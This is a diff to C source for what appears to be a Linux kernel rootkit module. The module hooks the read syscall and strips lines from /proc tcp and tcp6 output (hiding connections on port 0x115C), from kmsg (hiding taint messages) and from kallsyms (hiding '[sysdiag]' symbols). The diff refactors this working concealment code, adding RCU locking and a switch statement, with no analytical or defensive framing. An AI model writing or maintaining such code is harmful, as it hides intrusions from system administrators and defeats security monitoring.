@@ -10,7 +10,6 @@ static char portstr[8];
 static asmlinkage long (*og_read)(unsigned int fd, char __user *buf,
                                   size_t count);
 
-/* bounded search — lines are not null-terminated, so no strstr */
 static bool line_contains(const char *hay, size_t hlen, const char *needle)
 {
     size_t n = strlen(needle);
@@ -25,7 +24,6 @@ static bool line_contains(const char *hay, size_t hlen, const char *needle)
     return false;
 }
 
-/* erase every line containing any needle; returns new length */
 static long drop_lines(char *buf, long ret, const char **needles, int n)
 {
     char *line = buf;
@@ -56,7 +54,6 @@ static long drop_lines(char *buf, long ret, const char **needles, int n)
     return ret;
 }
 
-/* copy user buffer in, filter, copy shrunk result back */
 static long filter_user_buf(char __user *buf, long ret,
                             const char **needles, int n)
 {
@@ -71,7 +68,7 @@ static long filter_user_buf(char __user *buf, long ret,
         return ret;
     }
 
-        ret = drop_lines(kbuf, ret, needles, n);
+    ret = drop_lines(kbuf, ret, needles, n);
     if (copy_to_user(buf, kbuf, ret))
         ret = -EFAULT;
     kfree(kbuf);
@@ -88,6 +85,7 @@ static asmlinkage long hooked_read(unsigned int fd, char __user *buf,
     long ret = og_read(fd, buf, count);
     struct file *file;
     const char *name;
+    int filter = 0;
 
     if (ret <= 0)
         return ret;
@@ -96,25 +94,29 @@ static asmlinkage long hooked_read(unsigned int fd, char __user *buf,
     if (!file)
         return ret;
 
+    /* stable name snapshot under RCU (rename-safe) */
+    rcu_read_lock();
     name = file->f_path.dentry->d_name.name;
 
-    if (strcmp(name, "tcp") == 0 || strcmp(name, "tcp6") == 0) {
-        fput(file);
-        return filter_user_buf(buf, ret, tcp_n, 1);   /* hide :115C lines */
+    if (name[0] == 't') {
+        if (strcmp(name, "tcp") == 0 || strcmp(name, "tcp6") == 0)
+            filter = 1;
+    } else if (name[0] == 'k') {
+        if (strcmp(name, "kmsg") == 0)
+            filter = 2;
+        else if (strcmp(name, "kallsyms") == 0)
+            filter = 3;
     }
-
-    if (strcmp(name, "kmsg") == 0) {
-        fput(file);
-        return filter_user_buf(buf, ret, kmsg_n, 2);  /* hide taint lines */
-    }
-
-    if (strcmp(name, "kallsyms") == 0) {
-        fput(file);
-        return filter_user_buf(buf, ret, ksym_n, 1);  /* hide [sysdiag] symbols */
-    }
+    rcu_read_unlock();
 
     fput(file);
-    return ret;
+
+    switch (filter) {
+    case 1:  return filter_user_buf(buf, ret, tcp_n, 1);
+    case 2:  return filter_user_buf(buf, ret, kmsg_n, 2);
+    case 3:  return filter_user_buf(buf, ret, ksym_n, 1);
+    default: return ret;
+    }
 }
 
 /* call once from init, BEFORE hooks install */
